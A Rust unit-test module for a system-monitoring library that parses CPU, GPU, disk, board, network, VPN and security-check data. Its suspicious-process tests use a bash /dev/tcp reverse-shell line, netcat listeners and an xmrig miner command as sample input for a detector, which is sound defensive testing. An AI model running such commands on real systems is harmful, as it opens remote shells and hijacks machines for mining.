        let hwmon = concat!("coretemp\n", "45100\n", "46200\n", "45300\n", "\n", "k10temp\n", "52300\n");
        let s = out(sys_cpu(
            cpuinfo.as_ptr(), cpuinfo.len(),
            stat.as_ptr(), stat.len(),
            hwmon.as_ptr(), hwmon.len(),
        ));
        assert!(s.contains(r#""model":"AMD Ryzen 9 9950X""#), "got: {s}");
        assert!(s.contains(r#""cores":2"#), "got: {s}");
        assert!(s.contains(r#""temp_c":45.1"#), "coretemp 45100/1000 = 45.1; got: {s}");
        // per-core stat lines returned raw for the host delta
        assert!(s.contains(r#""cpu0 60"#), "got: {s}");
        assert!(s.contains(r#""cpu1 63"#), "got: {s}");
        // aggregate line is the first line of /proc/stat
        assert!(s.contains(r#""stat":"cpu  123"#), "got: {s}");
    }

    #[test]
    fn cpu_cores_ignore_processor_in_model_name() {
        let cpuinfo = "processor\t: 0\nmodel name\t: Common KVM processor\nprocessor\t: 1\n";
        let s = out(sys_cpu(
            cpuinfo.as_ptr(), cpuinfo.len(),
            std::ptr::null(), 0,
            std::ptr::null(), 0,
        ));
        assert!(s.contains(r#""cores":2"#), "got: {s}");
    }

    #[test]
    fn cpu_temp_skips_non_cpu_hwmon_devices() {
        // an unrelated nvme/board device first must be skipped
        let hwmon = concat!("nvme\n", "33000\n", "\n", "coretemp\n", "51000\n");
        let s = out(sys_cpu(
            std::ptr::null(), 0,
            std::ptr::null(), 0,
            hwmon.as_ptr(), hwmon.len(),
        ));
        assert!(s.contains(r#""temp_c":51.0"#), "nvme must be skipped, coretemp read; got: {s}");
    }

    #[test]
    fn parses_gpu_nvidia_smi() {
        let nvidia = concat!(
            "NVIDIA GeForce RTX 4080, 61, 3, 16376, 4096\n",
            "NVIDIA GeForce GT 1030, 40, 0, 2048, 512\n",
        );
        let s = out(sys_gpu(nvidia.as_ptr(), nvidia.len(), std::ptr::null(), 0));
        assert!(s.contains(r#""name":"NVIDIA GeForce RTX 4080","temp_c":61,"util_pct":3,"mem_total_mb":16376,"mem_used_mb":4096"#), "got: {s}");
        assert!(s.contains(r#""name":"NVIDIA GeForce GT 1030""#), "got: {s}");
    }

    #[test]
    fn parses_gpu_hwmon_fallback() {
        // amdgpu/i915 fallback: "name\ntemp\ntutil\0\nfreq\n" per device
        let hwmon = concat!("amdgpu\n", "48000\n", "25\n", "0\n", "\n");
        let s = out(sys_gpu(std::ptr::null(), 0, hwmon.as_ptr(), hwmon.len()));
        assert!(s.contains(r#""name":"amdgpu","temp_c":48.0,"util_pct":25"#), "got: {s}");
    }

    #[test]
    fn parses_board_and_temps() {
        let hw = concat!("nct6798\n", "31000\n", "29000\n", "\n");
        let s = out(sys_board(
            "B650 AORUS".as_ptr(), "B650 AORUS".len(),
            "Gigabyte".as_ptr(), "Gigabyte".len(),
            "rev 1.0".as_ptr(), "rev 1.0".len(),
            "American Megatrends".as_ptr(), "American Megatrends".len(),
            "F21d".as_ptr(), "F21d".len(),
            "04/11/2024".as_ptr(), "04/11/2024".len(),
            "B650 AORUS".as_ptr(), "B650 AORUS".len(),
            hw.as_ptr(), hw.len(),
        ));
        assert!(s.contains(r#""board_name":"B650 AORUS""#), "got: {s}");
        assert!(s.contains(r#""board_vendor":"Gigabyte""#), "got: {s}");
        assert!(s.contains(r#""bios_version":"F21d""#), "got: {s}");
        assert!(s.contains(r#""temps_c":[31.0,29.0]"#), "got: {s}");
    }

    #[test]
    fn disk_skips_appimage_and_pseudo_mounts() {
        let df = concat!(
            "Filesystem 1B-blocks Used Available Capacity Mounted on\n",
            "/dev/nvme0n1p4 1500000000000 135000000000 1365000000000 9% /\n",
            "tmpfs 19000000000 2500000 18997500000 1% /run\n",
            "/dev/sdb1 64000000000 32000000000 32000000000 50% /run/media/dev/USB\n",
            "/home/u/Apps/Foo.AppImage 8388608 8388608 0 100% /tmp/.mount_FooAbC12\n",
            "/dev/loop3 134217728 134217728 0 100% /snap/core22/1122\n",
        );
        let out_ptr = sys_disk(df.as_ptr(), df.len());
        let len = str_len(out_ptr);
        let s = unsafe { std::str::from_utf8_unchecked(std::slice::from_raw_parts(out_ptr, len)) };
        assert!(!s.contains(".mount_"), "AppImage mount must be skipped; got: {s}");
        assert!(!s.contains("/snap/"), "snap mount must be skipped; got: {s}");
        assert!(!s.contains(r#""mount":"/run""#), "tmpfs must be skipped; got: {s}");
        assert!(s.contains(r#""mount":"/""#), "root must be kept; got: {s}");
        assert!(s.contains("/run/media/dev/USB"), "removable drive must be kept; got: {s}");
        assert!(s.contains(r#""root_used_pct":9.0"#), "got: {s}");
        free_str(out_ptr);
    }

    fn sec_out(ss: &str, ps: &str, sysctl: &str, sshd: &str, facts: &str) -> String {
        let p = sys_sec(
            ss.as_ptr(), ss.len(),
            ps.as_ptr(), ps.len(),
            sysctl.as_ptr(), sysctl.len(),
            sshd.as_ptr(), sshd.len(),
            facts.as_ptr(), facts.len(),
        );
        let len = str_len(p);
        let s = unsafe {
            std::str::from_utf8_unchecked(std::slice::from_raw_parts(p, len)).to_string()
        };
        free_str(p);
        s
    }

    #[test]
    fn sec_parses_ports_exposure_and_dedup() {
        let ss = concat!(
            "tcp   LISTEN 0 4096   127.0.0.1:631   0.0.0.0:* users:((\"cupsd\",pid=9,fd=7))\n",
            "tcp   LISTEN 0 128    0.0.0.0:22      0.0.0.0:* users:((\"sshd\",pid=1,fd=3))\n",
            "tcp   LISTEN 0 128    [::]:22         [::]:*\n",
            "udp   UNCONN 0 0      0.0.0.0:5353    0.0.0.0:*\n",
        );
        let s = sec_out(ss, "", "", "", "");
        assert!(s.contains(r#""port":22,"process":"sshd","exposed":true"#), "got: {s}");
        assert!(s.contains(r#""addr":"127.0.0.1","port":631,"process":"cupsd","exposed":false"#), "got: {s}");
        // v6 dup of :22 has a DIFFERENT addr → kept; same-key rows dedup
        assert_eq!(s.matches(r#""port":22"#).count(), 2, "got: {s}");
        assert!(s.contains(r#""proto":"udp","addr":"0.0.0.0","port":5353"#), "got: {s}");
    }

    #[test]
    fn sec_flags_suspicious_procs_only() {
        let ps = concat!(
            "  1 root /sbin/init splash\n",
            " 77 evil /tmp/.hidden/backdoor -d\n",
            " 88 bob  xmrig --url pool.example\n",
            " 99 bob  ncat -l 4444\n",
            "111 bob  bash -c bash -i >& /dev/tcp/1.2.3.4/9001 0>&1\n",
            "222 dev  /usr/bin/vim /tmp/notes.txt\n", // /tmp ARG is fine — exe isn't in /tmp
        );
        let s = sec_out("", ps, "", "", "");
        assert!(s.contains("world-writable"), "got: {s}");
        assert!(s.contains("cryptominer"), "got: {s}");
        assert!(s.contains("netcat listener"), "got: {s}");
        assert!(s.contains("reverse-shell"), "got: {s}");
        assert!(!s.contains("init"), "init must not be flagged; got: {s}");
        assert!(!s.contains("vim"), "arg-only /tmp must not be flagged; got: {s}");
    }

    #[test]
    fn sec_checks_from_sysctl_sshd_and_facts() {
        let sysctl = "randomize_va_space 2\nptrace_scope 0\nkptr_restrict 1\nip_forward 1\n";
        let sshd = "#PermitRootLogin prohibit-password\nPermitRootLogin yes\nPasswordAuthentication no\nPermitRootLogin no\nMatch User bob\n  PasswordAuthentication yes\n";
        let facts = "secureboot disabled\nluks 1\nupdates 4\n";
        let s = sec_out("", "", sysctl, sshd, facts);
        assert!(s.contains(r#""id":"aslr","label":"ASLR","value":"full","ok":true"#), "got: {s}");
        assert!(s.contains(r#""id":"ptrace","label":"ptrace scope","value":"0","ok":false"#), "got: {s}");
        assert!(s.contains(r#""id":"ipfwd","label":"IP forwarding","value":"on","ok":false"#), "got: {s}");
        // first non-comment directive wins, Match blocks ignored → root yes = fail; password no = ok
        assert!(s.contains(r#""id":"ssh_root","label":"SSH root login","value":"yes","ok":false"#), "got: {s}");
        assert!(s.contains(r#""id":"ssh_pass","label":"SSH password auth","value":"no","ok":true"#), "got: {s}");
        assert!(s.contains(r#""id":"secboot","label":"Secure Boot","value":"disabled","ok":false"#), "got: {s}");
        assert!(s.contains(r#""id":"luks","label":"Disk encryption","value":"LUKS","ok":true"#), "got: {s}");
        assert!(s.contains(r#""id":"updates","label":"Pending updates","value":"4","ok":false"#), "got: {s}");
        // dmesg_restrict was NOT in the input → check must be absent, not failing
        assert!(!s.contains("dmesg"), "missing input must omit the check; got: {s}");
    }

    #[test]
    fn sec_names_the_crypt_scheme_and_checks_av() {
        let s = sec_out("", "", "", "", "luks 1\ncrypt BitLocker\nav off\n");
        assert!(s.contains(r#""id":"luks","label":"Disk encryption","value":"BitLocker","ok":true"#), "got: {s}");
        assert!(s.contains(r#""id":"av","label":"Real-time antivirus","value":"off","ok":false"#), "got: {s}");
    }

    #[test]
    fn sec_unknowns_are_skipped_never_failed() {
        let s = sec_out("", "", "", "", "secureboot unknown\nluks -1\nupdates -1\n");
        assert_eq!(s, r#"{"ports":[],"procs":[],"checks":[]}"#, "got: {s}");
    }

    #[test]
    fn parses_lsusb() {
        let raw = "Bus 001 Device 002: ID 1234:5678 USB Hub\nBus 002 Device 001: ID 0001:0002 Mouse\n";
        let out_ptr = sys_lsusb(raw.as_ptr(), raw.len());
        let len = str_len(out_ptr);
        let s = unsafe { std::str::from_utf8_unchecked(std::slice::from_raw_parts(out_ptr, len)) };
        assert!(s.contains(r#""bus":"001""#), "got: {s}");
        assert!(s.contains(r#""name":"USB Hub""#), "got: {s}");
        free_str(out_ptr);
    }

    #[test]
    fn detects_vpn() {
        // nordlynx interface (NordVPN) — must be detected
        let links = r#"[{"ifname":"nordlynx","operstate":"UNKNOWN","flags":["POINTOPOINT","UP"]},{"ifname":"enp8s0","operstate":"UP"}]"#;
        let out_ptr = sys_net(
            std::ptr::null(), 0,           // addr_json
            links.as_ptr(), links.len(),   // link_json
            std::ptr::null(), 0,           // route
            "none".as_ptr(), 4,            // fw_state
            std::ptr::null(), 0,           // speed_info
        );
        let len = str_len(out_ptr);
        let s = unsafe { std::str::from_utf8_unchecked(std::slice::from_raw_parts(out_ptr, len)) };
        assert!(s.contains(r#""vpn":true"#), "nordlynx should be detected as VPN; got: {s}");
        free_str(out_ptr);
    }

    #[test]
    fn detects_pointtopoint_vpn() {
        // POINTOPOINT flag without a known VPN interface name
        let links = r#"[{"ifname":"wg0","operstate":"UNKNOWN","flags":["POINTOPOINT","UP"]}]"#;
        let out_ptr = sys_net(
            std::ptr::null(), 0,
            links.as_ptr(), links.len(),
            std::ptr::null(), 0,
            "none".as_ptr(), 4,
            std::ptr::null(), 0,
        );
        let len = str_len(out_ptr);
        let s = unsafe { std::str::from_utf8_unchecked(std::slice::from_raw_parts(out_ptr, len)) };
        assert!(s.contains(r#""vpn":true"#), "POINTOPOINT should be detected as VPN; got: {s}");
        free_str(out_ptr);
    }

    #[test]
    fn parses_lspci_nnmm() {
        // quote-delimited -nnmm line with trailing rev/progif fields
        let raw = concat!(
            "00:00.0 \"Host bridge [0600]\" ",
            "\"Advanced Micro Devices, Inc. [AMD] [1022]\" \"Device [14d8]\" -p00\n",
            "03:00.0 \"VGA compatible controller [0300]\" \"NVIDIA Corporation [10de]\" \"AD104 [2704]\"\n",
        );
        let out_ptr = sys_lspci(raw.as_ptr(), raw.len());
        let len = str_len(out_ptr);
        let s =
            unsafe { std::str::from_utf8_unchecked(std::slice::from_raw_parts(out_ptr, len)) };
        assert!(s.contains(r#""class":"Host bridge [0600]""#), "got: {s}");
        assert!(
            s.contains(r#""vendor":"Advanced Micro Devices, Inc. [AMD] [1022]""#),
            "got: {s}"
        );
        assert!(s.contains(r#""name":"Device [14d8]""#), "got: {s}");
        assert!(s.contains(r#""class":"VGA compatible controller [0300]""#), "got: {s}");
        free_str(out_ptr);
    }

    #[test]
    fn parses_dimms() {
        let raw = "Memory Device\n\tSize: 32 GB\n\tSpeed: 5600 MT/s\n\tType: DDR5\n\tLocator: DIMM 0\n\nMemory Device\n\tSize: No Module Installed\n\tLocator: DIMM 1\n\n";
        let out_ptr = sys_dimms(raw.as_ptr(), raw.len());
        let len = str_len(out_ptr);
        let s = unsafe { std::str::from_utf8_unchecked(std::slice::from_raw_parts(out_ptr, len)) };
        assert!(s.contains(r#""size":"32 GB""#), "got: {s}");
        assert!(s.contains(r#""speed":"5600 MT/s""#), "got: {s}");
        assert!(!s.contains("No Module"), "empty slots should be excluded; got: {s}");
        free_str(out_ptr);
    }
    fn net_out(links: &str, fw: &str) -> String {
        out(sys_net(std::ptr::null(), 0, links.as_ptr(), links.len(), std::ptr::null(), 0,
            fw.as_ptr(), fw.len(), std::ptr::null(), 0))
    }

    #[test]
    fn vpn_needs_operstate_up_and_ignores_tap() {
        let down = r#"[{"ifname":"wg0","operstate":"DOWN","flags":["POINTOPOINT"]}]"#;
        assert!(net_out(down, "none").contains(r#""vpn":false"#));
        let tap = r#"[{"ifname":"tap0","operstate":"UP","flags":["BROADCAST","UP"]}]"#;
        assert!(net_out(tap, "none").contains(r#""vpn":false"#));
        let tun = r#"[{"ifname":"tun0","operstate":"UNKNOWN","flags":["UP"]}]"#;
        assert!(net_out(tun, "none").contains(r#""vpn":true"#));
    }

    #[test]
    fn firewall_backend_passes_through() {
        assert!(net_out("", "defender:active").contains(r#""firewall":{"backend":"defender","active":true}"#));
        assert!(net_out("", "ufw:inactive").contains(r#""firewall":{"backend":"ufw","active":false}"#));
        assert!(net_out("", "none").contains(r#""firewall":{"backend":"none","active":false}"#));
    }

    #[test]
    fn gpu_nvidia_na_fields_default_zero() {
        let nv = "NVIDIA GeForce RTX 3050 Laptop GPU, [N/A], [Not Supported], 4096, 12\n";
        let s = out(sys_gpu(nv.as_ptr(), nv.len(), std::ptr::null(), 0));
        assert!(s.contains(r#""temp_c":0,"util_pct":0,"mem_total_mb":4096,"mem_used_mb":12"#), "got: {s}");
    }

    #[test]
    fn board_temps_prefer_superio_over_nvme_acpi() {
        let hw = concat!("acpitz\n", "27800\n", "\n", "nvme\n", "40000\n", "\n", "nct6799\n", "31000\n", "-60000\n", "0\n", "29000\n", "\n");
        let e = "";
        let s = out(sys_board(e.as_ptr(), 0, e.as_ptr(), 0, e.as_ptr(), 0, e.as_ptr(), 0,
            e.as_ptr(), 0, e.as_ptr(), 0, e.as_ptr(), 0, hw.as_ptr(), hw.len()));
        assert!(s.contains(r#""temps_c":[31.0,29.0]"#), "got: {s}");
        let hw = concat!("nvme\n", "40000\n", "\n", "acpitz\n", "27800\n", "\n");
        let s = out(sys_board(e.as_ptr(), 0, e.as_ptr(), 0, e.as_ptr(), 0, e.as_ptr(), 0,
            e.as_ptr(), 0, e.as_ptr(), 0, e.as_ptr(), 0, hw.as_ptr(), hw.len()));
        assert!(s.contains(r#""temps_c":[27.8]"#), "nvme never a board temp; got: {s}");
    }

    #[test]
    fn disk_mount_with_spaces_avail_and_windows_root() {
        let df = concat!(
            "Filesystem 1B-blocks Used Available Capacity Mounted on\n",
            "/dev/sdc1 1000 400 500 44% /run/media/u/My Disk\n",
            "C: 2000 500 1500 25% C:\n",
        );
        let s = out(sys_disk(df.as_ptr(), df.len()));
        assert!(s.contains(r#""mount":"/run/media/u/My Disk""#), "got: {s}");
        assert!(s.contains(r#""root_total_b":2000,"root_used_b":500,"root_used_pct":25.0,"root_avail_b":1500"#), "got: {s}");
    }

    #[test]
    fn sec_procs_no_false_positives() {
        let ps = concat!(
            " 10 dev /tmp/.mount_machinXyz/machine --no-sandbox\n",
            " 11 dev rsync -lt a b\n",
            " 12 dev x11vnc -localhost\n",
            " 13 dev /usr/bin/nc -lvnp 4444\n",
        );
        let s = sec_out("", ps, "", "", "");
        assert!(!s.contains("mount_"), "AppImage mount is benign; got: {s}");
        assert!(!s.contains("rsync") && !s.contains("x11vnc"), "got: {s}");
        assert!(s.contains(r#""pid":13"#), "got: {s}");
    }

    #[test]
    fn zero_size_alloc_is_safe() {
        let p = alloc(0);
        assert!(!p.is_null());
        dealloc(p, 0);
    }
}